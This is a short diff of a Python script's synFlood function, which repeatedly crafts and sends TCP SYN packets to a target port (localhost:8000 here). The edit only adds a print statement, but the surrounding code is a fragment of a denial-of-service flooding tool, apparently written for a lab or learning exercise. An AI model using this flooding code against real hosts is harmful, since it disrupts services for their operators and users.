@@ -22,6 +22,7 @@ def synFlood(tgt = "127.0.0.1", dport = 8000):
 		tcpLayer = TCP(sport = sPort, dport = dport, flags = "S")
 		packet = ipLayer / tcpLayer
 		send(packet)
-
+		print("send")
+		
 if __name__ == "__main__":
 	synFlood("127.0.0.1", 8000)
